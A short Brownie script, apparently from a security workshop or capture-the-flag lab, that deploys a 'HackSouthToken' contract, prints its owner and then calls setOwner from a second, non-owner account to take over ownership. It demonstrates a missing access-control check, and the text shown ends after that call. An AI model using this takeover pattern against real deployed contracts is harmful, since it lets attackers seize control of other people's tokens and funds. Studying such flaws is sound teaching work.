from brownie import HackSouthToken,accounts
from brownie.convert import to_bytes
from brownie.utils import color

name = "HACKSOUTH"
symbol = "HSO"
amount = 10_000_000_000_000_000_000_000

def deploy_contracts():
    return HackSouthToken.deploy(name, symbol, accounts[0], amount, {"from":accounts[0]})
    
def main():
    hacksouth_token = deploy_contracts()

    # show owner
    print("{}[+] current owner: {}{}".format(color('green'), hacksouth_token.owner({"from":accounts[1]}), color('reset')))

    # update owner
    hacksouth_token.setOwner({"from":accounts[1]})
    
    
    